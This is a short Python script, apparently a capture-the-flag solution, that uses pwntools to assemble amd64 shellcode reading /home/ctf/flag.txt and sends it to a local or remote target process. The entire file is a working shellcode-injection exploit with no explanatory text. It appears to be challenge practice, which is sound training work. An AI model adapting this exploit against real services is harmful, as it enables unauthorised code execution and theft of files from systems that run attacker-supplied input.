import sys

import pwn


TARGET = "/home/ctf/flag.txt"


def main(argv):
    pwn.context.arch = 'amd64'
    if len(argv) == 2:
        p = pwn.process(argv[1])
    elif len(argv) == 3:
        p = pwn.remote(argv[1], int(argv[2]))
    else:
        raise ValueError("need process or remote")
    sc = pwn.shellcraft.amd64.linux.cat2(TARGET, 1, 1024)
    sc += pwn.shellcraft.amd64.linux.exit(0)
    print(sc)
    scraw = pwn.asm(sc)
    pad = b'\xcc' * (1024 - len(scraw))
    scraw += pad
    p.recv()
    p.send(scraw)
    val = p.recvall()
    print(val)


if __name__ == '__main__':
    main(sys.argv)
